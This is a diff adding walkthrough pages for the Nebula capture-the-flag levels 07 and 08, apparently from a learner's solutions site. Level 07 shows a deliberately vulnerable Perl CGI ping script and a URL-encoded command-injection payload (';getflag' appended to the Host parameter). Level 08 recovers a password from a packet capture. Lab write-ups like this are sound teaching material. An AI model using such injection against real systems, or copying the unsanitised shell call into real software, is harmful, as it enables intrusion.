@@ -400,6 +400,102 @@ write(1, buf, rc);
 
 
 
+			<h3 class="heading"> level07 <a href="https://exploit.education/nebula/level-07/" > <img src="../images/link.svg"> </a></h3>
+			<p> Username : level07 <br> Password : level07 </p>
+			<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. To do this level, log in as the level07 account with the password level06. Files for this level can be found in /home/flag07.<br><br>
+			</p>
+			<h4>Source Code</h4>
+			<div class=highlight>
+			<pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/perl</span>
+
+<span style=color:#66d9ef>use</span> CGI <span style=color:#e6db74>qw{param}</span>;
+
+<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Content-type: text/html\n\n&#34;</span>;
+
+<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>ping</span> {
+  $host <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>0</span>];
+
+  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&#34;</span>);
+
+  @output <span style=color:#f92672>=</span> <span style=color:#e6db74>`ping -c 3 $host 2&gt;&amp;1`</span>;
+  <span style=color:#66d9ef>foreach</span> $line (@output) { <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;$line&#34;</span>; }
+
+  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+  
+}
+
+<span style=color:#75715e># check if Host set. if not, display normal page, etc</span>
+
+ping(param(<span style=color:#e6db74>&#34;Host&#34;</span>));</code></pre></div>
+
+			<button class="accordion">Explanation</button>
+			<div class="panel">
+			<p>This program takes the first argument it receives, pings it and prints the output. From the config file thttpd.conf, we can find out the port number used by the scipt. We can see the output by visiting the page using curl . <pre class="code">curl http://&lt;ip addr of machine&gt;:7000/index.cgi?Host=127.0.0.1</pre></p>
+			<img class="imag" src="images/nebula/7a.png" height="auto" width="70%">
+			<p>In the program the value of Host is passed on to the ping funciton. Here the passed value is stored into a 'host' variable ($_[0] means the first argument passed into the function).
+			That value is later used in the ping command to ping the specified host and the output is printed out.<br>
+			Reading this may help you: <a href="https://stackoverflow.com/questions/3200801/how-can-i-call-a-shell-command-in-my-perl-script"> How can i call shell command in my perl scirpt</a></p>
+			</div>
+
+			<button class="accordion">Hint01</button>
+			<div class="panel">
+			<p>If executing system commands from a program doesnt ring any bells i dont know what does. You can manipulate the input to chain commands.</p>
+			</div>
+
+			<button class="accordion">Hint01</button>
+			<div class="panel">
+			<p>You may need to use URL encoding.</p>
+			</div>
+
+			<button class="accordion">Solution</button>
+			<div class="panel">
+			<p>The command we can try to execute is </p><pre class="code">ping -c 3 127.0.0.1;getflag</pre>
+			<p>I first tied to use the query string (the whole request is in quotes or else our system splits the command into two)</p><pre class="code">?Host=127.0.0.1;getflag</pre> So i url encoded ';' which is %3B. <pre class="code">curl http://&lt;ip addr of machine&gt;:7000/index.cgi?Host=127.0.0.1%3Bgetflag</pre>
+			<img class="imag" src="images/nebula/7b.png" height="auto" width="70%">
+			</div>
+
+
+
+			<h3 class="heading"> level08 <a href="https://exploit.education/nebula/level-08/" > <img src="../images/link.svg"> </a></h3>
+			<p> Username : level08 <br> Password : level08 </p>
+			<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.<br><br>
+			</p>
+			<button class="accordion">Explanation</button>
+			<div class="panel">
+			<p>There is a .pcap file in the home dir of flag08. We can use wireshark to open the file and read it. </p>
+<pre class="code">
+level08@nebula:~$ cd /home/flag08
+level08@nebula:/home/flag08$ ls
+capture.pcap
+</pre>
+			<p>We can copy this file to our machine using scp (secure copy). Just like cp command, the scp requires a souce and destinaiton</p>
+			<pre class="code">scp level08@192.168.196.149:/home/flag08/capture.pcap .</pre>
+			<p>Use wireshark to analyse the file </p>
+      <pre class="code">wireshark capture.pcap</pre>
+			</div>
+
+			<button class="accordion">Hint01</button>
+			<div class="panel">
+			<p>We can see that a login was attempted and we even have the credentials. Right click on a packet and select TCP Stream in the Follow option.We can see the username and password. But, there is a catch.</p>
+			<img class="imag" src="images/nebula/8a.png" height="auto" width="70%">
+			</div>
+
+			<button class="accordion">Hint02</button>
+			<div class="panel">
+			<p>The non printable characters are represented with '.'. Find out what they actually represent. You may want to see the data as hex instead of ascii.</p>
+			</div>
+
+			<button class="accordion">Solution</button>
+			<div class="panel">
+			<img class="imag" src="images/nebula/8b.png" height="auto" width="70%">
+			<p>The non printable characters were hex values '7f' and '0d'. 7f represents backspace and 0d represents Carriage Return. So the password is not backdoor...00Rm8.ate but insteas is '<b>backd00Rmate</b>'.<br> You can now switch user to flag08 and execute the getflag.</p>
+			<img class="imag" src="images/nebula/8c.png" height="auto" width="70%">			
+			</div>
+
+
+
+
+
 
 <script>
 var acc = document.getElementsByClassName("accordion");
